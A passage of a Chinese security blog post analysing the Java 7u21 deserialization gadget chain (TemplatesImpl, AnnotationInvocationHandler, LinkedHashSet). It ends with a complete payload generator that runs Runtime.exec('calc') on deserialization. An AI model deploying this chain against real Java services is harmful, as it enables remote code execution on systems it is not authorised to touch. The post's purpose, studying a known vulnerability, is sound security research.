TemplatesImpl.TransletClassLoader loader &#x3D; (TemplatesImpl.TransletClassLoader)AccessController.doPrivileged(new PrivilegedAction() &#123;</span><br><span class="line">                public Object run() &#123;</span><br><span class="line">                    return new TemplatesImpl.TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                int classCount &#x3D; this._bytecodes.length;</span><br><span class="line">                this._class &#x3D; new Class[classCount];</span><br><span class="line"></span><br><span class="line">                for(int i &#x3D; 0; i &lt; classCount; ++i) &#123;</span><br><span class="line">                    this._class[i] &#x3D; loader.defineClass(this._bytecodes[i]);  \\将_bytecodes中的所有字节通过defineClass转化为一个类</span><br><span class="line">                    Class superClass &#x3D; this._class[i].getSuperclass();</span><br><span class="line">                    if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                        this._transletIndex &#x3D; i;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        this._auxClasses.put(this._class[i].getName(), this._class[i]);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>也就是说通过这个方法可以将_bytecodes数组中的字节还原成一个类，存储到_class变量中。接下来如果我们能找到调用defineTransletClasses方法并执行了_class[].newinstance() 这样的的代码的方法，就能实例化从字节得到的类了，从而就能执行类中的静态代码块和构造函数了！<br>所以接下来我们需要去寻找这种方法。<br>通过搜索defineTransletClasses，我们找到了有如下三个方法调用了defineTransletClasses方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getTransletInstance</span><br><span class="line">getTransletIndex</span><br><span class="line">getTransletClasses</span><br></pre></td></tr></table></figure><p>其中，getTransletInstance方法是唯一符合“调用了defineTransletClasses且有_class[].newinstance()”的方法，其代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Translet getTransletInstance() throws TransformerConfigurationException &#123;</span><br><span class="line">        ErrorMsg err;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (this._name &#x3D;&#x3D; null) &#123;</span><br><span class="line">                return null;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                if (this._class &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    this.defineTransletClasses();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                AbstractTranslet translet &#x3D; (AbstractTranslet)this._class[this._transletIndex].newInstance(); \\here</span><br><span class="line">                translet.postInitialization();</span><br><span class="line">                translet.setTemplates(this);</span><br><span class="line">                translet.setServicesMechnism(this._useServicesMechanism);</span><br><span class="line">                if (this._auxClasses !&#x3D; null) &#123;</span><br><span class="line">                    translet.setAuxiliaryClasses(this._auxClasses);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return translet;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>那么，getTransletInstance是一个private方法，我们不能直接调用它，在那里能去调用它呢？答案是newTransformer方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123;</span><br><span class="line">      TransformerImpl transformer &#x3D; new TransformerImpl(this.getTransletInstance(), this._outputProperties, this._indentNumber, this._tfactory);  \\here</span><br><span class="line">········</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>OK.我们找到了触发7u21链的一个核心点了。我们写个小demo来通过TemplatesImpl实现代码执行<br>小demo的实现思路为：通过javassist动态生成一个恶意类（构造方法或者静态代码块有恶意代码），然后通过反射生成一个TemplatesImpl对象并设置各个变量的值，然后调用一下TemplatesImpl对象的newTransformer方法即可造成代码执行，代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd); \\向静态代码块插入恶意代码，插入到构造函数也可以</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));  \\需设置此项才能实现newinstance，具体原因请看defineTransletClasses和getTransletInstance源码</span><br><span class="line">        cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">        byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">        Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组</span><br><span class="line">            try &#123; </span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;对数组中的每一项实现私有访问</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                    Field.set(templates,targetByteCodes);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                    Field.set(templates,null);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                    Field.set(templates,&quot;abc&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                    Field.set(templates,new TemplatesImpl());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但仅仅是这样，肯定是不够的。</p><h2 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h2><p>我们继续看ysoserial源码可以看到动用了AnnotationInvocationHandler这个东西.这个类原本的作用是作为Annotation 类的动态代理</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330014037679.png" alt="image-20210330014037679"></p><p>我们把目光聚焦于invoke方法——动态代理的核心</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public Object invoke(Object var1, Method var2, Object[] var3) &#123;</span><br><span class="line">     String var4 &#x3D; var2.getName();</span><br><span class="line">     Class[] var5 &#x3D; var2.getParameterTypes();</span><br><span class="line">     if (var4.equals(&quot;equals&quot;) &amp;&amp; var5.length &#x3D;&#x3D; 1 &amp;&amp; var5[0] &#x3D;&#x3D; Object.class) &#123;</span><br><span class="line">         return this.equalsImpl(var3[0]);</span><br><span class="line">     &#125; </span><br><span class="line">     ..........</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>它会检测传入的方法中是否有符合 名为equals，只有一个Object类型参数。若是，则调用equalsImpl方法并传入方法中的参数。<br>跟进equalsimpl方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private Boolean equalsImpl(Object var1) &#123;</span><br><span class="line">    if (var1 &#x3D;&#x3D; this) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125; else if (!this.type.isInstance(var1)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Method[] var2 &#x3D; this.getMemberMethods();</span><br><span class="line">        int var3 &#x3D; var2.length;</span><br><span class="line"></span><br><span class="line">        for(int var4 &#x3D; 0; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">            Method var5 &#x3D; var2[var4];</span><br><span class="line">            String var6 &#x3D; var5.getName();</span><br><span class="line">            Object var7 &#x3D; this.memberValues.get(var6);</span><br><span class="line">            Object var8 &#x3D; null;</span><br><span class="line">            AnnotationInvocationHandler var9 &#x3D; this.asOneOfUs(var1);</span><br><span class="line">            if (var9 !&#x3D; null) &#123;</span><br><span class="line">                var8 &#x3D; var9.memberValues.get(var6);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    var8 &#x3D; var5.invoke(var1);   \\here</span><br><span class="line">                &#125; catch (InvocationTargetException var11) &#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125; catch (IllegalAccessException var12) &#123;</span><br><span class="line">                    throw new AssertionError(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现会invoke 传入参数中的所有方法。<br>那么接下来我们就可以按照下面的思路写一个命令执行小demo:</p><p>创建一个包含恶意代码的TemplatesImpl实例，通过AnnotationInvocationHandler创建任意一个代理对象，然后代理对象调用equals方法传入参数为恶意TemplatesImpl对象，即可造成恶意代码执行<br>看到这里一定一头雾水，看看demo也许会好一点</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public class test&#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">        CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">        String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">        CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc);</span><br><span class="line">        cons.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line">        byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">        byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">        TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">        Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">        Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">        for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组</span><br><span class="line">            try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误</span><br><span class="line">                Field.setAccessible(true);  &#x2F;&#x2F;对数组中的每一项实现私有访问</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                    Field.set(templates,targetByteCodes);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                    Field.set(templates,null);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                    Field.set(templates,&quot;abc&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                    Field.set(templates,new TemplatesImpl());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#x2F;&#x2F;以上代码生成了恶意TemplatesImpl对象templates</span><br><span class="line"></span><br><span class="line">        Map map &#x3D; new HashMap();</span><br><span class="line">        final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];  &#x2F;&#x2F;获得AnnotationInvocationHandler构造方法，方便获得它一个实例</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line">        InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map);  &#x2F;&#x2F;这里有个问题，为什么要传入Templates类对象而不是TemplatesImpl</span><br><span class="line">        Object proxy &#x3D; Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);  \\反正创建一个AnnotationInvocationHandler的代理对象就行了，前两个参数都不用怎么管</span><br><span class="line">        proxy.equals(templates); &#x2F;&#x2F;恶意代码执行</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们慢慢看看逻辑，在proxy.equals处下断点，调试<br>毫无疑问会进入到此处：AnnotationInvocationHandler的invoke方法。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012424056.png" alt="image-20210330012424056"></p><p>然后参数符合if判断，调用equalsImpl方法，并传入参数为恶意TemplatesImpl对象，接下来就是进入反射调用处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012648729.png" alt="image-20210330012648729"></p><p>遍历var2变量中的方法，并由我们的恶意对象来执行。</p><p>————此处插一下var2变量的来历</p><p>注意此处的getMemberMethods方法，它实质上是通过反射获得this.type中的所有方法。而this.type是在该对象构造方法中传入的第一个参数。</p><p>getMemberMethods：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012934623.png" alt="image-20210330012934623"></p><p>构造方法：</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330012959824.png" alt="image-20210330012959824"></p><p>————回到正题</p><p>由于我们通过反射传入构造方法的第一个参数是Templates.class，所以它会遍历Templates类中的所有方法。这个类其实是TemplatesImpl的接口类，它的代码如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330013201875.png" alt="image-20210330013201875"></p><p>所以var2中存储的方法只有两个，newTransformer和getOutputProperties。<br>然后当遍历到newTransformer方法时，就会通过反射调用达到  eviltemplatesImpl.newTransformer() 的效果，从而导致恶意TemplatesImpl对象中的恶意代码被执行。</p><p>这里承接上面说的，为什么初始化AnnotationInvocationHandler对象时传入的第一个参数（即this.type)是Templates.class，而不是TemplatesImpl.class<br>诚然，这两个类对象都有方法newTransformer。但是如果传入TemplatesImpl.class，在遍历其中方法并通过反射执行时会出现错误：equalsImpl中的反射调用是不传入参数的</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330013705054.png" alt="image-20210330013705054"></p><p>而TemplatesImpl中有许多需要传入参数才能被正常使用的方法，如果不传入参数就反射调用就会抛出异常，以至于在遍历到newTransformer方法前就会抛出异常，从而导致代码执行不被实现。</p><p>仅仅是这样，也还是不够的，我们还是得手动调用equals才能导致代码执行，反序列化点在哪里？</p><h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><p>ysoserial的payload中出现了此类。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330014015703.png" alt="image-20210330014015703"></p><p>LinkedHashSet继承自HashSet类，它的readObject方法也是从HashSet继承而来的。我们看看readObject方法的构造</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        int var2 &#x3D; var1.readInt();</span><br><span class="line">        float var3 &#x3D; var1.readFloat();</span><br><span class="line">        this.map &#x3D; (HashMap)(this instanceof LinkedHashSet ? new LinkedHashMap(var2, var3) : new HashMap(var2, var3));</span><br><span class="line">        int var4 &#x3D; var1.readInt();</span><br><span class="line"></span><br><span class="line">        for(int var5 &#x3D; 0; var5 &lt; var4; ++var5) &#123;</span><br><span class="line">            Object var6 &#x3D; var1.readObject();</span><br><span class="line">            this.map.put(var6, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的主要亮点在for循环里面：遍历传入的序列化对象，将其反序列化后，再传入put方法</p><p>所以我们再来跟进一下map.put方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public V put(K var1, V var2) &#123;</span><br><span class="line">    if (var1 &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return this.putForNullKey(var2);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        int var3 &#x3D; this.hash(var1);</span><br><span class="line">        int var4 &#x3D; indexFor(var3, this.table.length);</span><br><span class="line"></span><br><span class="line">        for(HashMap.Entry var5 &#x3D; this.table[var4]; var5 !&#x3D; null; var5 &#x3D; var5.next) &#123;</span><br><span class="line">            Object var6;</span><br><span class="line">            if (var5.hash &#x3D;&#x3D; var3 &amp;&amp; ((var6 &#x3D; var5.key) &#x3D;&#x3D; var1 || var1.equals(var6))) &#123;  &#x2F;&#x2F;here</span><br><span class="line">                Object var7 &#x3D; var5.value;</span><br><span class="line">                var5.value &#x3D; var2;</span><br><span class="line">                var5.recordAccess(this);</span><br><span class="line">                return var7;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ++this.modCount;</span><br><span class="line">        this.addEntry(var3, var1, var2, var4);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意我们添加注释那一行，有一个var1.equals(var6)))  其中var1和var6我们都是可以控制的：var1即传入的反序列化对象(恶意TemplatesImpl)，var6实际上也是我们传入的反序列化对象（恶意AnnotationInvocationHandler代理对象）。 </p><p>但是想要执行var1.equals(var6))) 则必须要让  var5.hash == var3 为true 且 (var6 = var5.key) == var1为false.<br>怎么做到呢？</p><p>注意put方法的第5行，对传入的反序列化对象调用了hash方法。我们跟进hash方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">final int hash(Object var1) &#123;</span><br><span class="line">    int var2 &#x3D; 0;</span><br><span class="line">    if (this.useAltHashing) &#123;</span><br><span class="line">        if (var1 instanceof String) &#123;</span><br><span class="line">            return Hashing.stringHash32((String)var1);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        var2 &#x3D; this.hashSeed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    var2 ^&#x3D; var1.hashCode();  &#x2F;&#x2F;here</span><br><span class="line">    var2 ^&#x3D; var2 &gt;&gt;&gt; 20 ^ var2 &gt;&gt;&gt; 12;</span><br><span class="line">    return var2 ^ var2 &gt;&gt;&gt; 7 ^ var2 &gt;&gt;&gt; 4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现会执行传入的参数对象的hashCode()方法<br>当我们传入的参数为恶意AnnotationInvocationHandler代理对象时，会调用代理对象中的invoke方法。对于AnnotationInvocationHandler而言当判断到执行hashCode方法时，实质上会执行AnnotationInvocationHandler中的hashCodeImpl方法</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330155159938.png" alt="image-20210330155159938"></p><p>我们跟进hashCodeImpl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    private int hashCodeImpl() &#123;</span><br><span class="line">        int var1 &#x3D; 0;</span><br><span class="line"></span><br><span class="line">        Entry var3;</span><br><span class="line">        for(Iterator var2 &#x3D; this.memberValues.entrySet().iterator(); var2.hasNext(); var1 +&#x3D; 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">            var3 &#x3D; (Entry)var2.next();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return var1;</span><br><span class="line">    &#125;</span><br><span class="line">上面是真实代码，比较难看，所以借鉴了一下别人对其进行修改后的代码，方便我们进行分析</span><br><span class="line">private int hashCodeImpl() &#123;</span><br><span class="line">  int result &#x3D; 0;</span><br><span class="line">  &#x2F;&#x2F; 遍历 memberValues</span><br><span class="line">  Iterator itr &#x3D; this.memberValues.entrySet().iterator();</span><br><span class="line">  for( ;itr.hasNext(); ) &#123;</span><br><span class="line">      Entry entry &#x3D; (Entry)itr.next();</span><br><span class="line">      String key &#x3D; ((String)entry.getKey());</span><br><span class="line">      Object value &#x3D; entry.getValue();</span><br><span class="line">      &#x2F;&#x2F; 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或</span><br><span class="line">      result +&#x3D; 127 * key.hashCode() ^ memberValueHashCode(value);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法会遍历this.memberValues属性（这个属性实质上就是HashMap内添加的属性），然后对其中每一项键值属性进行进行位运算并累加</p><p>其中memberValueHashCode函数我们也可以跟进一下<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330163952543.png" alt="image-20210330163952543"></p><p>发现只要传入参数不为数组，就调用它的hashCode函数并返回。</p><p>我们来梳理一下，怎么才能调用到put方法里的equals触发代码执行：<br>payload阶段：</p><p>建立一个map变量，其key为特殊的一个值:f5a5a608,这个值的hashCode是0，然后值为恶意templatesImpl类，然后以这个map变量为参数建立AnnotationInvocationHandler代理对象。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330214752872.png" alt="image-20210330214752872"></p><p>再向HashMap里放入一个值，键为恶意TemplatesImpl对象，<br>再放入一个值，键为恶意AnnotationInvocationHandler对象。<br>（LinkedHashSet会让HashMap有序，从而在反序列化的时候能按顺序依次从HashMap读取对象。如果用HashSet，则会在反序列化时报错）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210330215307269.png" alt="image-20210330215307269"></p><p>反序列化阶段：    </p><p>随后在readObject时，TemplatesImpl先被put方法调用。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134536961.png" alt="image-20210331134536961"></p><p>然后在put方法里通过hash()方法获得其hash，并将其录入到它的hash属性里，然后写入到HashMap的存储队列里。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134644800.png" alt="image-20210331134644800">然后AnnotationInvocationHandler再被put方法调用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134717624.png" alt="image-20210331134717624">在对其使用hash方法获得hash时，会因其是一个代理类的缘故在hash函数内部调用hashCode()方法时会调用其代理方法hashCodeImpl。     </p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134852582.png" alt="image-20210331134852582"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134859824.png" alt="image-20210331134859824"></p><p>随后在hashCodeImpl内部遍历this.memberValues变量（也就是之前初始化时放入的map变量）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331135006119.png" alt="image-20210331135006119"></p><p>将每一项的key值的hashCode与传入map vaule值作为参数的memberValueHashCode方法进行异或。<br>这个memberValueHashCode方法会判断传入的值是否为数组，若不是数组则直接返回参数的hashCode()。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331134924166.png" alt="image-20210331134924166"></p><p>因为我们之前初始化代理对象时传入的是一个键为f5a5a608，值为eviltemplates的map，所以以上hash计算最终得到的结果，便是0^(templatesImpl.hashCode()). 也就是templatesImpl.hashCode()。所以也就是说AnnotationInvocationHandler对象作为参数传入被hash方法执行后的结果，就相当于是hash(eviltemplates)</p><p>随后这个值来到if判断逻辑，它遍历之前的值，并将遍历得到的值赋给var5</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331135236639.png" alt="image-20210331135236639"></p><p>上一个值的hash（也就是eviltemplates的hash）与AnnotationInvocationHandler对象的hash（也还是eviltemplates的hash）相同，但是AnnotationInvocationHandler对象与eviltemplates对象并不相同，所以便触动了equals，代码执行成功。</p><h2 id="完整payload"><a href="#完整payload" class="headerlink" title="完整payload"></a>完整payload</h2><p>纵观以上三个类，我们可以写出payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">      ClassPool pool &#x3D; ClassPool.getDefault();</span><br><span class="line">      CtClass cc &#x3D; pool.makeClass(&quot;evilclass&quot;);</span><br><span class="line">      String cmd &#x3D; &quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;;</span><br><span class="line">      CtConstructor cons &#x3D; new CtConstructor(new CtClass[]&#123;&#125;,cc);</span><br><span class="line">      cons.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);</span><br><span class="line">      cc.addConstructor(cons);</span><br><span class="line">      cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">      cc.setName(&quot;evilClass&quot;);</span><br><span class="line"></span><br><span class="line">      byte[] evilbytes &#x3D; cc.toBytecode();</span><br><span class="line">      byte[][] targetByteCodes &#x3D; new byte[][]&#123;evilbytes&#125;;</span><br><span class="line">      TemplatesImpl templates &#x3D; TemplatesImpl.class.newInstance();</span><br><span class="line">      Class clazz &#x3D; TemplatesImpl.class.newInstance().getClass();</span><br><span class="line">      Field[] Fields &#x3D; clazz.getDeclaredFields();</span><br><span class="line">      for (Field Field : Fields) &#123; &#x2F;&#x2F;遍历Fields数组</span><br><span class="line">          try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误</span><br><span class="line">              Field.setAccessible(true);  &#x2F;&#x2F;对数组中的每一项实现私有访问</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_bytecodes&quot;)&#123;</span><br><span class="line">                  Field.set(templates,targetByteCodes);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_class&quot;)&#123;</span><br><span class="line">                  Field.set(templates,null);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_name&quot;)&#123;</span><br><span class="line">                  Field.set(templates,&quot;abc&quot;);</span><br><span class="line">              &#125;</span><br><span class="line">              if(Field.getName()&#x3D;&#x3D;&quot;_tfactory&quot;)&#123;</span><br><span class="line">                  Field.set(templates,new TemplatesImpl());</span><br><span class="line">              &#125;</span><br><span class="line">          &#125; catch (Exception e) &#123;&#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      Map map &#x3D; new HashMap();</span><br><span class="line">      String magicStr &#x3D; &quot;f5a5a608&quot;;</span><br><span class="line">      final Constructor&lt;?&gt; ctor &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructors()[0];</span><br><span class="line">      ctor.setAccessible(true);</span><br><span class="line"></span><br><span class="line">      InvocationHandler invocationHandler &#x3D; (InvocationHandler) ctor.newInstance(Templates.class, map);</span><br><span class="line">      Object proxy &#x3D;  Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler);</span><br><span class="line">      HashSet target &#x3D; new LinkedHashSet();</span><br><span class="line">      target.add(templates);</span><br><span class="line">      target.add(proxy);</span><br><span class="line">      &#x2F;&#x2F;这个map需要在Hashmap put了proxy后再赋值，不然会报错（我也不知道为什么</span><br><span class="line">      map.put(magicStr, templates);</span><br><span class="line">      &#x2F;&#x2F; 序列化</span><br><span class="line">      ObjectOutputStream oos &#x3D; new ObjectOutputStream(new FileOutputStream(filename));</span><br><span class="line">      oos.writeObject(target);</span><br><span class="line">      &#x2F;&#x2F; 反序列化</span><br><span class="line">      ObjectInputStream ois &#x3D; new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">      ois.readObject();</span><br></pre></td></tr></table></figure><p>看一下调用栈</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210331140050263.png" alt="image-20210331140050263"></p><p>更直观的调用链</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (0)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                 &#x2F;&#x2F; TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()</span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个链是目前调过最长的了…. 能想出这种链的绝壁是天才吧</p>]]></content>
    
    
      
      
